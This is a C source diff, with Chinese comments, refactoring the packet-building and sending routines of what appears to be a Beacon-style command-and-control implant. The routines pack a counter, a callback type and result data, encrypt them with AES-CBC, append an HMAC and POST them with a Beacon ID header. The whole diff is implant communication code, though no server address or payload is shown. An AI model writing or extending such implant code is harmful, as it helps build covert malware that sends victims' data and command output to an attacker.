@@ -128,7 +128,8 @@ static BOOL append_data(unsigned char** buf, size_t* buf_length, size_t* buf_cap
 unsigned char* MakePacket(int callback, unsigned char* postMsg, size_t msgLen, size_t* msg_length) {
     Counter += 1;
 
-    size_t buf_capacity = 1024; // 初始缓冲区容量
+    // 初始缓冲区容量
+    size_t buf_capacity = 1024; 
     size_t buf_length = 0;
     unsigned char* buf = (unsigned char*)malloc(buf_capacity);
     if (!buf) {
@@ -136,31 +137,35 @@ unsigned char* MakePacket(int callback, unsigned char* postMsg, size_t msgLen, s
         return NULL;
     }
 
-    // 添加 Counter
-    uint8_t counterBytes[4];
-    PutUint32BigEndian(counterBytes, (uint32_t)Counter);
-    if (!append_data(&buf, &buf_length, &buf_capacity, counterBytes, 4)) {
-		fprintf(stderr, "append_data failed for counterBytes\n");
+    // 写入 Counter（大端 4 Byte）
+    uint8_t counter_be[4];
+    PutUint32BigEndian(counter_be, (uint32_t)Counter);
+
+    if (!append_data(&buf, &buf_length, &buf_capacity, counter_be, 4)) {
+        fprintf(stderr, "append_data failed for counter_big_endian\n");
         return NULL;
     }
 
-    // 添加结果长度
+    // 写入结果长度（仅当 postMsg 存在时）
     if (postMsg) {
-        uint8_t resultLenBytes[4];
-        int resultLen = (int)msgLen + 4;
-        PutUint32BigEndian(resultLenBytes, (uint32_t)resultLen);
-        if (!append_data(&buf, &buf_length, &buf_capacity, resultLenBytes, 4)) {
-            fprintf(stderr, "append_data failed for msgLen\n");
+        uint32_t result_total_len = (uint32_t)msgLen + 4;
+
+        uint8_t result_len_be[4];
+        PutUint32BigEndian(result_len_be, result_total_len);
+
+        if (!append_data(&buf, &buf_length, &buf_capacity, result_len_be, 4)) {
+            fprintf(stderr, "append_data failed for result_len_be\n");
             free(buf);
-			return NULL;
+            return NULL;
         }
     }
 
-    // 添加 callback
-    uint8_t callbackTypeBytes[4];
-    PutUint32BigEndian(callbackTypeBytes, (uint32_t)callback);
-    if (!append_data(&buf, &buf_length, &buf_capacity, callbackTypeBytes, 4)) {
-		fprintf(stderr, "append_data failed for callbackTypeBytes\n");
+    // 写入 Callback 类型（大端 4 Byte）
+    uint8_t callback_be[4];
+    PutUint32BigEndian(callback_be, (uint32_t)callback);
+
+    if (!append_data(&buf, &buf_length, &buf_capacity, callback_be, 4)) {
+        fprintf(stderr, "append_data failed for callback_be\n");
         free(buf);
         return NULL;
     }
@@ -173,55 +178,60 @@ unsigned char* MakePacket(int callback, unsigned char* postMsg, size_t msgLen, s
         }
     }
 
-    // AES CBC 加密
-    size_t decryptAES_CBCdatalen;
-    unsigned char* EncryptAES_CBCdata = AesCBCEncrypt(buf, aeskey, buf_length, &decryptAES_CBCdatalen);
+    size_t cipher_len = 0;
+
+    // AES CBC 加密（输出包含 16 字节 IV + ciphertext）
+    unsigned char* cipher_buf = AesCBCEncrypt(buf, aeskey, buf_length, &cipher_len);
     free(buf);
 
-    if (!EncryptAES_CBCdata) {
+    if (!cipher_buf) {
         fprintf(stderr, "AesCBCEncrypt failed\n");
         return NULL;
     }
 
-    unsigned char* encrypted = EncryptAES_CBCdata + 16; // 存放HMAC Hash
-    size_t encryptedBytesLen = decryptAES_CBCdatalen - 16;
+    // 跳过 16 字节 IV，得到纯 ciphertext 部分
+    unsigned char* ciphertext_ptr = cipher_buf + 16;
+    size_t ciphertext_len = cipher_len - 16;
 
-    // 构建最终数据包
-	// decryptAES_CBCdatalen(4Bytes) | encryptedBytes(decryptAES_CBCdatalen - 16 Bytes) | HMAC(16Bytes)
-    int sendLength = decryptAES_CBCdatalen;
-    size_t finalBufLen = 4 + encryptedBytesLen + 16;
-    unsigned char* finalBuf = (unsigned char*)malloc(finalBufLen);
-    if (!finalBuf) {
+    // 构建最终数据包：4字节大端长度 | ciphertext | HMAC(16 Byte)
+    uint32_t aes_total_len = (uint32_t)cipher_len;
+    size_t packet_len = 4 + ciphertext_len + 16;
+
+    unsigned char* packet_buf = (unsigned char*)malloc(packet_len);
+    if (!packet_buf) {
         fprintf(stderr, "Memory allocation failed\n");
-        free(EncryptAES_CBCdata);
+        free(cipher_buf);
         return NULL;
     }
 
-    uint8_t sendLenBigEndian[4];
-    PutUint32BigEndian(sendLenBigEndian, (uint32_t)sendLength);
-    memcpy(finalBuf, sendLenBigEndian, 4);
-    memcpy(finalBuf + 4, encrypted, encryptedBytesLen);
+    // 写入 AES 加密总长度（大端 4 Byte）
+    uint8_t aes_len_be[4];
+    PutUint32BigEndian(aes_len_be, aes_total_len);
+    memcpy(packet_buf, aes_len_be, 4);
 
-    unsigned char* hmacResult = HMkey(encrypted, encryptedBytesLen);
-    memcpy(finalBuf + 4 + encryptedBytesLen, hmacResult, 16);
+    // 写入加密后的 ciphertext
+    memcpy(packet_buf + 4, ciphertext_ptr, ciphertext_len);
 
-    *msg_length = finalBufLen;
+    // 计算并写入 HMAC（16 Byte）
+    unsigned char* hmac_buf = HMkey(ciphertext_ptr, ciphertext_len);
+    memcpy(packet_buf + 4 + ciphertext_len, hmac_buf, 16);
 
-    free(hmacResult);
-    free(EncryptAES_CBCdata);
+    *msg_length = packet_len;
 
-    return finalBuf;
+    free(hmac_buf);
+    free(cipher_buf);
+
+    return packet_buf;
 }
 
 VOID DataProcess(unsigned char* postMsg, size_t msgLen, int callbackType) {
     unsigned char* BeaconIdHeader = makeBeaconIdHeader();
-    unsigned char* dataString = makePostData(postMsg, msgLen, callbackType);
-    size_t dataSize = strlen(dataString);
+    unsigned char* postData = makePostData(postMsg, msgLen, callbackType);
+    size_t dataSize = strlen(postData);
 
-    wchar_t BeaconIdWideHeader[256];
-    MultiByteToWideChar(CP_ACP, 0, BeaconIdHeader, -1, BeaconIdWideHeader, 256);
+	wchar_t* BeaconIdWideHeader = convertToWideChar(BeaconIdHeader);
 
-    POST(dataString, dataSize, BeaconIdWideHeader);
-	free(dataString);
+    POST(postData, dataSize, BeaconIdWideHeader);
+	free(postData);
     free(BeaconIdHeader);
 }
